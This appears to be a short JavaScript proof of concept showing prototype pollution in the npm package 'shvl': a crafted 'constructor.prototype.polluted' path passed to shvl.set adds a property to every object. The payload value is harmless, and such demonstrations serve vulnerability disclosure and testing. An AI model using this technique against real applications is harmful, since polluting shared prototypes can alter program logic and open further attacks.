var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var shvl = require('shvl');
obj = {};
console.log({}.polluted);
shvl.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);